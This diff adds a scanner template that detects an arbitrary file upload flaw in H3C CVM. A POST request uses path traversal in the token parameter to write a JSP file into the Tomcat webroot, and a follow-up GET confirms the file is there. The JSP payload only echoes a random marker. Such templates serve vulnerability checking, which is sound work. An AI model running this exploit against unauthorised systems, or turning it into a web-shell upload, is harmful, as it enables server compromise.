@@ -1,0 +1,20 @@
+name: H3C-CVM-Anyfileupload
+set:
+  hosturl: target.url
+  r1: randomLowercase(20)
+rules:
+  r0:
+    request:
+      method: POST
+      path:  /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{r1}}.jsp&name=222
+      body: |
+        <%out.print("{{r1}}");%>
+    expression: response.status == 200 && response.body.bcontains(b'message')
+  r1:
+    request:
+      method: GET
+      path: //cas/js/lib/buttons/{{r1}}.jsp
+      headers:
+        Referer: "{{hosturl}}/cas/login"
+    expression: response.status == 200 && response.body.bcontains(bytes(r1)) && response.headers["content-type"].icontains("text/html")
+expression: r0() && r1()
